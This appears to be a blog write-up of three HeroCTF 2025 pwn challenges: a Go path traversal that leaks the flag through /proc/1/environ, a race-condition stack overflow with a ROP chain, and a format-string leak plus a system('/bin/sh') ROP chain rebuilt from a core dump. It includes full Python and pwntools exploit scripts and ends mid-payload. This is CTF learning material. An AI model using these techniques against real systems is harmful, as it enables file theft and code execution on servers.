<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HeroCTF2025 PWN Writeup | Wgg's Blog Site</title>
<meta name=keywords content><meta name=description content='paf_traversal
漏洞点
func HandleDownloadWordlist(c *gin.Context) {
    wordlistDir := getWordlistDir()

    json := DownloadRequest{}
    if err := c.ShouldBindJSON(&amp;json); err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
        return
    }

    fileName := path.Base(json.Filename)  // LINE 46: Sanitized but UNUSED!
    filePath := filepath.Join(wordlistDir, json.Filename)  // LINE 47: Uses unsanitized input!

    f, err := os.Open(filePath)  // LINE 49: Opens the unsanitized path
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
        return
    }
    defer f.Close()

    data, err := io.ReadAll(f)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
        return
    }

    c.JSON(http.StatusOK, gin.H{
        "filename": fileName,  // Returns sanitized name
        "content":  string(data),  // But returns content from unsanitized path!
    })
}
Key Issue: Line 46 calls path.Base(json.Filename) to sanitize the filename, but this result is stored in fileName and only used for the response. Line 47 uses the original unsanitized json.Filename to construct the file path, allowing path traversal!'><meta name=author content="Me"><link rel=canonical href=https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/"><meta property="og:site_name" content="Wgg's Blog Site"><meta property="og:title" content="HeroCTF2025 PWN Writeup"><meta property="og:description" content='paf_traversal 漏洞点 func HandleDownloadWordlist(c *gin.Context) { wordlistDir := getWordlistDir() json := DownloadRequest{} if err := c.ShouldBindJSON(&amp;json); err != nil { c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}) return } fileName := path.Base(json.Filename) // LINE 46: Sanitized but UNUSED! filePath := filepath.Join(wordlistDir, json.Filename) // LINE 47: Uses unsanitized input! f, err := os.Open(filePath) // LINE 49: Opens the unsanitized path if err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}) return } defer f.Close() data, err := io.ReadAll(f) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}) return } c.JSON(http.StatusOK, gin.H{ "filename": fileName, // Returns sanitized name "content": string(data), // But returns content from unsanitized path! }) } Key Issue: Line 46 calls path.Base(json.Filename) to sanitize the filename, but this result is stored in fileName and only used for the response. Line 47 uses the original unsanitized json.Filename to construct the file path, allowing path traversal!'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-01T23:30:00+08:00"><meta property="article:modified_time" content="2025-12-01T23:30:00+08:00"><meta property="og:image" content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HeroCTF2025 PWN Writeup"><meta name=twitter:description content='paf_traversal
漏洞点
func HandleDownloadWordlist(c *gin.Context) {
    wordlistDir := getWordlistDir()

    json := DownloadRequest{}
    if err := c.ShouldBindJSON(&amp;json); err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
        return
    }

    fileName := path.Base(json.Filename)  // LINE 46: Sanitized but UNUSED!
    filePath := filepath.Join(wordlistDir, json.Filename)  // LINE 47: Uses unsanitized input!

    f, err := os.Open(filePath)  // LINE 49: Opens the unsanitized path
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
        return
    }
    defer f.Close()

    data, err := io.ReadAll(f)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
        return
    }

    c.JSON(http.StatusOK, gin.H{
        "filename": fileName,  // Returns sanitized name
        "content":  string(data),  // But returns content from unsanitized path!
    })
}
Key Issue: Line 46 calls path.Base(json.Filename) to sanitize the filename, but this result is stored in fileName and only used for the response. Line 47 uses the original unsanitized json.Filename to construct the file path, allowing path traversal!'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wgggggggg.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HeroCTF2025 PWN Writeup","item":"https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HeroCTF2025 PWN Writeup","name":"HeroCTF2025 PWN Writeup","description":"paf_traversal 漏洞点 func HandleDownloadWordlist(c *gin.Context) { wordlistDir := getWordlistDir() json := DownloadRequest{} if err := c.ShouldBindJSON(\u0026amp;json); err != nil { c.JSON(http.StatusBadRequest, gin.H{\u0026#34;error\u0026#34;: err.Error()}) return } fileName := path.Base(json.Filename) // LINE 46: Sanitized but UNUSED! filePath := filepath.Join(wordlistDir, json.Filename) // LINE 47: Uses unsanitized input! f, err := os.Open(filePath) // LINE 49: Opens the unsanitized path if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\u0026#34;error\u0026#34;: err.Error()}) return } defer f.Close() data, err := io.ReadAll(f) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\u0026#34;error\u0026#34;: err.Error()}) return } c.JSON(http.StatusOK, gin.H{ \u0026#34;filename\u0026#34;: fileName, // Returns sanitized name \u0026#34;content\u0026#34;: string(data), // But returns content from unsanitized path! }) } Key Issue: Line 46 calls path.Base(json.Filename) to sanitize the filename, but this result is stored in fileName and only used for the response. Line 47 uses the original unsanitized json.Filename to construct the file path, allowing path traversal!\n","keywords":[],"articleBody":"paf_traversal 漏洞点 func HandleDownloadWordlist(c *gin.Context) { wordlistDir := getWordlistDir() json := DownloadRequest{} if err := c.ShouldBindJSON(\u0026json); err != nil { c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()}) return } fileName := path.Base(json.Filename) // LINE 46: Sanitized but UNUSED! filePath := filepath.Join(wordlistDir, json.Filename) // LINE 47: Uses unsanitized input! f, err := os.Open(filePath) // LINE 49: Opens the unsanitized path if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) return } defer f.Close() data, err := io.ReadAll(f) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) return } c.JSON(http.StatusOK, gin.H{ \"filename\": fileName, // Returns sanitized name \"content\": string(data), // But returns content from unsanitized path! }) } Key Issue: Line 46 calls path.Base(json.Filename) to sanitize the filename, but this result is stored in fileName and only used for the response. Line 47 uses the original unsanitized json.Filename to construct the file path, allowing path traversal!\n利用 有路径穿越的bug，但是我们再来看看entrypoints.sh\n#!/bin/bash echo \"${FLAG:-HEROCTF_FAKE_FLAG}\" \u003e \"/app/flag_$(openssl rand -hex 8).txt\" chmod 444 /app/flag_*.txt unset FLAG /app/cracker/cracker \u0026 cd /app/api/ \u0026\u0026 ./api 存放flag文件的名字是随机的，爆破也很难\n再来看看Dockerfile\n# =\u003e BUILDER FROM golang:1.25-trixie@sha256:a02d35efc036053fdf0da8c15919276bf777a80cbfda6a35c5e9f087e652adfc AS builder RUN apt-get update \u0026\u0026 \\ apt-get install -y --no-install-recommends build-essential make ca-certificates libssl-dev \u0026\u0026 \\ rm -rf /var/lib/apt/lists/* WORKDIR /src COPY ./api/ ./api/ COPY ./cracker/ ./cracker/ # Build the Go binary WORKDIR /src/api/ RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \\ go build -ldflags=\"-s -w\" -o api . # Build the C binary WORKDIR /src/cracker RUN make # =\u003e RUNTIME FROM debian:trixie@sha256:8f6a88feef3ed01a300dafb87f208977f39dccda1fd120e878129463f7fa3b8f AS runtime RUN apt-get update \u0026\u0026 \\ apt-get install -y --no-install-recommends openssl \u0026\u0026 \\ rm -rf /var/lib/apt/lists/* RUN useradd -m app -d /app/ COPY ./entrypoint.sh /entrypoint.sh # COPY --from=builder /src/api/ /app/api/ # COPY --from=builder /src/cracker/ /app/cracker/ COPY ./api/ /app/api/ COPY ./cracker/ /app/cracker/ RUN chmod +x /entrypoint.sh \u0026\u0026 \\ chown app:app -R /app/ USER app WORKDIR /app/ CMD [\"/entrypoint.sh\"] 其中entrypoint.sh是root权限运行的，那么./api有着root权限\n在 Linux 系统中（包括 Docker 容器），PID 1 是第一个启动的进程，它通常是系统的 init 或 entrypoint 进程\n/proc 文件系统： /proc 是一个虚拟文件系统，用于提供关于内核和进程的信息。/proc/1 目录包含了关于 PID 1 进程的所有信息（例如其命令行、文件描述符、内存使用情况等）。\n/proc 文件系统的读取权限在 Linux 中设计得非常精妙，旨在提供进程信息的同时，保护敏感数据。\n/proc 文件系统的基本读取权限 /proc 目录下的权限主要依赖于文件或目录所关联的 进程所有者 和 当前访问用户。\n1. 主目录权限 (/proc) 权限: 默认权限通常是 dr-xr-xr-x (即 555)。 含义: 所有人都可以进入 /proc 目录并查看其内容（主要是列出进程 ID 目录）。 2. 进程信息目录 (/proc/[PID]) 这是最关键的部分，例如 /proc/1 或 /proc/1234。\n目录/文件 权限所有者 可读取的用户 备注 /proc/[PID] 该 PID 进程的 所有者 所有者 和 Root (UID 0) 只有 Root 或进程所有者可以查看大部分敏感子文件。 /proc/[PID]/cmdline 该 PID 进程的 所有者 任何人 所有人都可以读取进程的命令行参数。 /proc/[PID]/exe 该 PID 进程的 所有者 Root 链接到执行文件，通常只有 Root 可以跟随链接（防止普通用户获取不属于他们的程序）。 /proc/[PID]/environ 该 PID 进程的 所有者 Root 包含进程的环境变量，通常只有 Root 可以读取，因为它可能包含密码或敏感 token。 /proc/[PID]/fd/* 该 PID 进程的 所有者 Root 文件描述符目录，通常只有 Root 或进程所有者可以查看。 换句话说，我们可以读取/proc/1/environ来获取entrypoint.sh启动时的FLAG环境变量\n由此便可以得到FLAG\n#!/usr/bin/env python3 \"\"\" Improved exploit for paf_traversal CTF challenge Key insights: 1. Download endpoint has path traversal 2. Cracker reads wordlist files and prints each line 3. Need to enumerate /proc to find flag file or leak filename \"\"\" import requests import sys import re import time from typing import Optional, List class Exploit: def __init__(self, base_url: str): self.base_url = base_url.rstrip('/') self.session = requests.Session() def download_file(self, path: str) -\u003e Optional[str]: \"\"\"Exploit path traversal in /api/wordlist/download\"\"\" url = f\"{self.base_url}/api/wordlist/download\" payload = {\"filename\": path} try: resp = self.session.post(url, json=payload, timeout=10) if resp.status_code == 200: data = resp.json() return data.get(\"content\") else: return None except Exception as e: return None def enumerate_proc_pids(self, max_pid: int = 100) -\u003e List[int]: \"\"\"Find active PIDs by trying to read /proc/[pid]/cmdline\"\"\" print(f\"[*] Enumerating PIDs in /proc (1-{max_pid})...\") active_pids = [] for pid in range(1, max_pid): content = self.download_file(f\"../../../proc/{pid}/cmdline\") if content: # Clean up cmdline (null-separated) cmdline = content.replace('\\x00', ' ').strip() if cmdline: print(f\" [+] PID {pid}: {cmdline[:80]}\") active_pids.append(pid) return active_pids def check_proc_maps(self, pid: int) -\u003e Optional[str]: \"\"\"Check /proc/[pid]/maps for memory mappings - might show flag file\"\"\" print(f\"[*] Checking /proc/{pid}/maps...\") content = self.download_file(f\"../../../proc/{pid}/maps\") if content and \"flag_\" in content: print(f\"[+] Found 'flag_' reference in maps!\") matches = re.findall(r'flag_([0-9a-f]{8})\\.txt', content) if matches: return matches[0] return None def check_proc_environ(self, pid: int) -\u003e Optional[str]: \"\"\"Check /proc/[pid]/environ for environment variables\"\"\" print(f\"[*] Checking /proc/{pid}/environ...\") content = self.download_file(f\"../../../proc/{pid}/environ\") if content and \"flag_\" in content.lower(): print(f\"[+] Found 'flag' in environ!\") # Parse null-separated environ env_vars = content.split('\\x00') for var in env_vars: if 'flag' in var.lower(): print(f\" {var}\") matches = re.findall(r'flag_([0-9a-f]{8})\\.txt', var) if matches: return matches[0] return None def check_proc_fd(self, pid: int, max_fd: int = 20) -\u003e Optional[str]: \"\"\"Check /proc/[pid]/fd/[num] for open file descriptors\"\"\" print(f\"[*] Checking /proc/{pid}/fd/ (0-{max_fd})...\") for fd in range(max_fd): # Try reading the symlink target via /proc/[pid]/fd/[num] content = self.download_file(f\"../../../proc/{pid}/fd/{fd}\") if content: # Check if it contains flag content if content.startswith(\"HERO\") or \"Hero{\" in content or \"hero{\" in content: print(f\"[+] FOUND FLAG in /proc/{pid}/fd/{fd}!\") return content # Print what we found preview = content[:100].replace('\\n', '\\\\n') print(f\" [\u003e] fd {fd}: {preview}...\") return None def check_proc_cwd(self, pid: int) -\u003e Optional[List[str]]: \"\"\"Check /proc/[pid]/cwd to see working directory\"\"\" # We can't list directories directly, but we can try common filenames print(f\"[*] Trying to read files in /proc/{pid}/cwd/...\") # Try reading common files that might exist test_files = [ \"entrypoint.sh\", \"api\", \"cracker\", \".dockerenv\", ] for filename in test_files: content = self.download_file(f\"../../../proc/{pid}/cwd/{filename}\") if content: print(f\" [+] Found: {filename}\") if \"flag_\" in content: matches = re.findall(r'flag_([0-9a-f]{8})\\.txt', content) if matches: return matches return None def try_ls_via_bash_history(self) -\u003e Optional[str]: \"\"\"Try to find bash history that might contain ls commands\"\"\" print(\"[*] Checking for bash history files...\") history_paths = [ \"../../../root/.bash_history\", \"../../../home/app/.bash_history\", \"../../../app/.bash_history\", ] for path in history_paths: content = self.download_file(path) if content and \"flag_\" in content: print(f\"[+] Found flag reference in {path}!\") matches = re.findall(r'flag_([0-9a-f]{8})\\.txt', content) if matches: return matches[0] return None def try_docker_env(self) -\u003e Optional[str]: \"\"\"Try reading Docker environment files\"\"\" print(\"[*] Checking Docker environment...\") docker_files = [ \"../../../proc/1/environ\", \"../../../proc/self/environ\", \"../../../.dockerenv\", ] for path in docker_files: content = self.download_file(path) if content: if \"FLAG\" in content or \"flag_\" in content: print(f\"[+] Found potential flag in {path}!\") env_vars = content.split('\\x00') for var in env_vars: print(f\" {var}\") if 'FLAG=' in var: return var.split('FLAG=')[1] matches = re.findall(r'flag_([0-9a-f]{8})\\.txt', var) if matches: return matches[0] return None def try_proc_self_status(self) -\u003e None: \"\"\"Read /proc/self/status for info\"\"\" print(\"[*] Reading /proc/self/status...\") content = self.download_file(\"../../../proc/self/status\") if content: # Look for working directory or other clues for line in content.split('\\n'): if 'Name' in line or 'Pid' in line: print(f\" {line}\") def read_proc_mounts(self) -\u003e None: \"\"\"Check /proc/mounts for mounted filesystems\"\"\" print(\"[*] Reading /proc/mounts...\") content = self.download_file(\"../../../proc/mounts\") if content: for line in content.split('\\n'): if '/app' in line or 'flag' in line: print(f\" {line}\") def try_glob_via_shell_expansion(self) -\u003e Optional[str]: \"\"\" Try to trigger shell expansion somehow This likely won't work as Go doesn't use shell for file ops \"\"\" print(\"[*] Attempting shell glob patterns (unlikely to work)...\") patterns = [ \"../../flag_[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f].txt\", \"../../flag_*.txt\", \"../../flag_????????.txt\", ] for pattern in patterns: content = self.download_file(pattern) if content and content.startswith(\"HERO\"): print(f\"[+] Pattern worked: {pattern}\") return content print(\" [-] As expected, glob patterns don't work with Go's os.Open()\") return None def systematic_proc_enumeration(self) -\u003e Optional[str]: \"\"\"Systematically enumerate /proc to find flag filename\"\"\" print(\"\\n\" + \"=\"*60) print(\"SYSTEMATIC /proc ENUMERATION\") print(\"=\"*60 + \"\\n\") # Step 1: Find active PIDs pids = self.enumerate_proc_pids(max_pid=50) print(f\"\\n[*] Found {len(pids)} active processes\\n\") # Step 2: Check each PID for clues for pid in pids: print(f\"\\n--- Examining PID {pid} ---\") # Check environ hex_val = self.check_proc_environ(pid) if hex_val: return hex_val # Check maps hex_val = self.check_proc_maps(pid) if hex_val: return hex_val # Check open file descriptors flag_content = self.check_proc_fd(pid, max_fd=10) if flag_content: print(f\"\\n[+] FOUND FLAG: {flag_content}\") return flag_content # Check cwd matches = self.check_proc_cwd(pid) if matches: return matches[0] return None def run(self): \"\"\"Main exploit routine\"\"\" print(\"=\"*60) print(\"PAF Traversal - IMPROVED Exploit v2\") print(\"=\"*60) print() # Verify vulnerability print(\"[*] Verifying path traversal vulnerability...\") passwd = self.download_file(\"../../../etc/passwd\") if passwd and \"root:\" in passwd: print(\"[+] Path traversal confirmed!\\n\") else: print(\"[-] Path traversal test failed!\") return # Try Docker environment first (quick check) result = self.try_docker_env() if result: if result.startswith(\"HERO\"): print(f\"\\n[+] FLAG FOUND: {result}\") return else: # It's a hex value, read the file flag = self.download_file(f\"../../flag_{result}.txt\") if flag: print(f\"\\n[+] FLAG FOUND: {flag}\") return # Try bash history hex_val = self.try_ls_via_bash_history() if hex_val: flag = self.download_file(f\"../../flag_{hex_val}.txt\") if flag: print(f\"\\n[+] FLAG FOUND: {flag}\") return # Try glob patterns (unlikely) flag = self.try_glob_via_shell_expansion() if flag: print(f\"\\n[+] FLAG FOUND: {flag}\") return # Do systematic proc enumeration result = self.systematic_proc_enumeration() if result: if result.startswith(\"HERO\") or result.startswith(\"Hero\"): print(f\"\\n[+] FLAG FOUND: {result}\") else: # It's a hex value flag = self.download_file(f\"../../flag_{result}.txt\") if flag: print(f\"\\n[+] FLAG FOUND: {flag}\") else: print(f\"\\n[+] Found hex value: {result}\") print(f\"[*] Try: ../../flag_{result}.txt\") else: print(\"\\n[-] Could not find flag filename\") print(\"[*] Additional ideas:\") print(\" 1. Check if cracker process can be used to read flag\") print(\" 2. Look for log files that might contain the filename\") print(\" 3. Try timing-based enumeration\") print(\" 4. Check for other info disclosure vectors\") if __name__ == \"__main__\": if len(sys.argv) != 2: print(f\"Usage: {sys.argv[0]} \") print(f\"Example: {sys.argv[0]} http://dyn12.heroctf.fr:12060\") sys.exit(1) target = sys.argv[1] exploit = Exploit(target) exploit.run() storycontest 多线程，收到连接后启动client_thread\n是一个菜单\n更改全局变量g_story_len，并且根据g_story_len读取内容赋值给全局字符串last_story 输出last_story 输出全局变量juru_gift的值 如果全局变量bonus_enabled为1，则输出flag 退出 漏洞点在case 1，\n读取g_story_len之后有一个usleep 0.5s的空间来进行竞态，此时再开一个线程把g_story_len改为一个很大的值，就可以溢出buf ，是一个栈溢出的漏洞。\n同时还有两个后门函数\ngift\nbonus_entry\n思路是先调用gift函数，将jury_gift修改为stdout，然后通过case 3泄露libc\n再调用bonus_entry函数，并且rdi需要是322420958，即0x1337C0DE，修改bonus_enabled为1，通过case 4获取flag\ngift函数和bonus_entry函数都是正常无法调用的，通过前面的栈溢出漏洞调用即可。\n流程如下\n开一个主线程A，线程B，C，线程B选择case 1，线程C修改g_story_len，线程B栈溢出覆盖返回地址为gift，主线程A选择case 3泄露libc 由于1泄露了libc，所以接下来就有了pop rdi; ret的gadgets，可以控制rdi。再开线程D，E，线程D选择case 1，线程D修改g_story_len，线程D栈溢出进行ROP，使得bonus_enabled为1 主线程A选择case 4输出flag即可。 坑点\n如果一个线程崩了（比如ret到了非法地址），整个程序也就崩了，我们得调用pthread_exit()来合法终止进行ROP的线程 call pthread_exit()时候的RBP需要是合法地址，否则还会崩（因为后面栈帧会恢复到这个时候并且进行一些操作） 调用pthread_exit()时RSP需要0x10对齐 #!/usr/bin/env python3 \"\"\" StoryContest PWN Exploit ========================= Exploit strategy: 1. Keep main connection alive 2. Thread 2: Race condition overflow → call gift() → leak libc via stdout 3. Main thread: Call show_jury_info() to get leaked address 4. Thread 3: Race condition overflow → ROP to bonus_entry(0x1337C0DE) 5. Main thread: Call show_public_results() → get flag Author: AI PWN Master \"\"\" from pwn import * import threading import time # ========================== # Configuration # ========================== BINARY = './storycontest_patched' HOST = 'dyn14.heroctf.fr' # Change to remote host PORT = 14369 # Addresses (No PIE, fixed) GIFT_ADDR = 0x401715 BONUS_ENTRY_ADDR = 0x4015fc MAGIC_VALUE = 0x1337C0DE MAIN_ADDR = 0x401C8A RET = 0x000000000040101a # Libc configuration LIBC_PATH = './libc.so.6' # Adjust if needed # Gadgets (found by find_gadgets.py) LIBC_POP_RDI_OFFSET = 0x000000000010f78b # pop rdi; ret LIBC_STDOUT_OFFSET = 0x2045c0 # stdout symbol LIBC_SYSTEM_OFFSET = 0x58750 # system() (if needed) # Exploit parameters BUF_OFFSET = 168 # buf to return address: 0xA0 + 8 RACE_SLEEP = 0.25 # Sleep time for race condition (adjust as needed) # ========================== # Context Setup # ========================== context.binary = elf = ELF(BINARY) context.log_level = 'info' # context.log_level = 'debug' try: libc = ELF(LIBC_PATH) except: warn(\"Libc not found, will try to leak and use\") libc = None # ========================== # Helper Functions # ========================== def connect_to_server(): \"\"\"Establish connection to the server\"\"\" if args.REMOTE: return remote(HOST, PORT) else: # For local testing return remote(HOST, PORT) def send_menu_choice(conn, choice): \"\"\"Send menu choice\"\"\" conn.sendlineafter(b'\u003e ', str(choice).encode()) def race_condition_overflow(payload, conn=None): \"\"\" Trigger race condition to overflow buffer Strategy: 1. Send legit length (128) to pass check 2. Another thread modifies global g_story_len 3. usleep(500ms) window for race 4. read() uses modified g_story_len → overflow \"\"\" if conn is None: conn = connect_to_server() try: # Menu choice 1: Submit a story send_menu_choice(conn, 1) # Send legit length conn.sendlineafter(b'story:', b'128') # Send overflow payload conn.sendafter(\"Now type your story:\\n\", payload) #conn.interactive() # Wait for response time.sleep(0.5) except Exception as e: warn(f\"Race condition exploit failed: {e}\") finally: try: conn.close() except: pass def race_modifier_thread(target_len=10000): \"\"\" Helper thread to modify global g_story_len This creates the TOCTOU race condition \"\"\" try: c = connect_to_server() send_menu_choice(c, 1) sleep(0.2) c.sendlineafter(b'story:', str(target_len).encode()) # Don't send data, just modify the global variable c.close() except: pass def trigger_race_with_modifier(payload): \"\"\"Launch race condition with helper thread\"\"\" # Start modifier thread t = threading.Thread(target=race_modifier_thread, daemon=True) t.start() #pause() race_condition_overflow(payload) # ========================== # Exploit Stages # ========================== def stage1_leak_libc(main_conn): \"\"\" Stage 1: Leak libc address via gift() function Returns: libc base address \"\"\" info(\"=\" * 60) info(\"STAGE 1: Leaking libc via gift()\") info(\"=\" * 60) # Build payload to call gift() payload = flat( b'A' * BUF_OFFSET, p64(RET), p64(GIFT_ADDR), ) info(f\"Payload length: {len(payload)}\") info(f\"Target: gift() @ {hex(GIFT_ADDR)}\") # Trigger race condition to call gift() info(\"Triggering race condition to call gift()...\") trigger_race_with_modifier(payload) # Wait for gift() to execute time.sleep(1) #main_conn.interactive() # Use main connection to leak the address info(\"Calling show_jury_info() to leak jury_gift...\") send_menu_choice(main_conn, 3) # Show jury info # Parse response response = main_conn.recvuntil(b'=== StoryJury ===', timeout=2) print(response) info(f\"Response:\\n{response.decode()}\") # Extract leaked address if b'Jury gift:' in response: leak_line = [l for l in response.split(b'\\n') if b'Jury gift:' in l][0] leak_str = leak_line.split(b':')[1].strip() leaked_addr = int(leak_str, 16) success(f\"Leaked address: {hex(leaked_addr)}\") # Calculate libc base libc_base = leaked_addr - LIBC_STDOUT_OFFSET success(f\"Libc base: {hex(libc_base)}\") # Verify if possible if libc and libc.symbols.get('stdout'): expected_base = leaked_addr - libc.symbols['stdout'] if expected_base == libc_base: success(\"Libc base calculation verified!\") else: warn(f\"Mismatch: expected {hex(expected_base)}\") return libc_base else: error(\"Failed to leak address!\") return None def stage2_activate_bonus(libc_base): \"\"\" Stage 2: Activate bonus mode by calling bonus_entry(0x1337C0DE) Uses ROP chain: pop rdi; ret 0x1337C0DE bonus_entry \"\"\" info(\"=\" * 60) info(\"STAGE 2: Activating bonus mode\") info(\"=\" * 60) # Build ROP chain if libc: # Try pwntools ROP first pop_rdi_addr = libc_base + LIBC_POP_RDI_OFFSET else: # Use hardcoded offset pop_rdi_addr = libc_base + LIBC_POP_RDI_OFFSET info(f\"pop rdi; ret @ {hex(pop_rdi_addr)}\") # Build payload payload = flat( b'B' * (BUF_OFFSET), p64(pop_rdi_addr), # pop rdi; ret p64(MAGIC_VALUE), # rdi = 0x1337C0DE p64(BONUS_ENTRY_ADDR), # bonus_entry() p64(GIFT_ADDR) ) info(f\"Payload length: {len(payload)}\") info(f\"ROP chain: pop_rdi → {hex(MAGIC_VALUE)} → bonus_entry\") # Trigger race condition info(\"Triggering race condition to activate bonus...\") trigger_race_with_modifier(payload) # Wait for execution time.sleep(1) success(\"Bonus mode should now be activated!\") return True def stage3_get_flag(main_conn): #pause() \"\"\" Stage 3: Get the flag via show_public_results() \"\"\" info(\"=\" * 60) info(\"STAGE 3: Getting the flag\") info(\"=\" * 60) # Call show_public_results (menu choice 4) info(\"Calling show_public_results()...\") send_menu_choice(main_conn, 4) # Receive flag response = main_conn.recvuntil(b'===', timeout=3) if b'Flag:' in response or b'Hero{' in response: success(\"FLAG CAPTURED!\") print(\"\\n\" + \"=\" * 60) print(response.decode()) print(\"=\" * 60 + \"\\n\") return True else: error(\"Failed to get flag!\") print(response.decode()) return False # ========================== # Main Exploit # ========================== def exploit(): \"\"\"Main exploit function\"\"\" info(\"=\" * 60) info(\"StoryContest Exploit Starting...\") info(\"=\" * 60) # Establish main connection info(\"Connecting to server...\") main_conn = connect_to_server() success(\"Main connection established\") # Receive initial banner main_conn.recvuntil(b'===') try: # Stage 1: Leak libc libc_base = stage1_leak_libc(main_conn) if libc_base is None: error(\"Stage 1 failed!\") return # Stage 2: Activate bonus if not stage2_activate_bonus(libc_base): error(\"Stage 2 failed!\") return # Stage 3: Get flag if stage3_get_flag(main_conn): success(\"Exploit successful!\") else: error(\"Stage 3 failed!\") finally: main_conn.close() # ========================== # Alternative: Manual mode # ========================== def manual_mode(): \"\"\"Interactive mode for manual exploitation\"\"\" conn = connect_to_server() conn.interactive() # ========================== # Entry Point # ========================== if __name__ == '__main__': if args.MANUAL: manual_mode() else: exploit() 本地复现\ncrash_players 一道有意思的题，题目没有给binary，只给了一个core dump文件，也就是进行某个失败exp时的dump信息\n写WP的时候没有远程环境，口述一下\n有两个阶段的输入\n在提示Name : 后输入一定内容，程序会回显 在提示Description : 后输入一定内容，程序不会回显 strings core简单查看一下，关键的有\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA疑似栈溢出时的填充\n%4$p.%7$p.%19$p格式化字符串利用\n0x1.0x7ffe59ca1160.0x7fe92c7ae24a格式化字符串输出（显然第二个是栈地址，第三个是libc地址）\n接下来测试远程程序。\n提示Name : 后输入%4$p.%7$p.%19$p，成功泄露地址（只能口述，没有环境:(）\n接下来gdb进一步查看core文件gdc -c core\n可以推测在提示Description : 后输入一定内容，存在栈溢出，推测崩的时候RBP是0x4141414141414141，显然进行了leave，而RIP还是正常地址，不是libc地址，所以死在了ret\n查看libc基地址，从而计算AAAAAAAA后的3个libc地址偏移，顺便看看是什么\n计算后得出是pop rdi; ret,binsh_addr,system\n接下来看看ROP填充的A的数量，为0x30\n通过上图发现ret的时候rsp还指着AAAAAAAA，所以想要覆盖到返回地址填充0x28即可\npayload = b'A' * 0x28 + p64(libc_base + 0x277e5) + p64(libc_base + 0x197031) + p64(libc_base + 0x4c490)\n这样发给Description：后并没有成功get shell，原因是system没有0x10对齐，所以应该改成\npayload = b'A' * 0x28 + p64(libc_base + 0x277e5) + p64(libc_base + 0x197031) + p64(libc_base + 0x277e5 + 1) + p64(libc_base + 0x4c490)\np64(libc_base + 0x277e5 + 1)是ret\n即可\n#!/usr/bin/env python3 from pwn import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] libcname = \"./libc.so.6\" host = \"dyn07.heroctf.fr\" port = 11454 if libcname: libc = ELF(libcname) def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) sh=start() payload1 = b\"%4$p.%7$p.%19$p\" sla(\"Name : \", payload1) sh.recvuntil(b\".\") stack = int(sh.recv(14), base = 16) sh.recv(1) libc_base = int(sh.recv(14), base = 16) - 0x2724a log.success(\"libc_base: \" + hex(libc_base)) payload2 = b'A' * 0x28 + p64(libc_base + 0x277e5) + p64(libc_base + 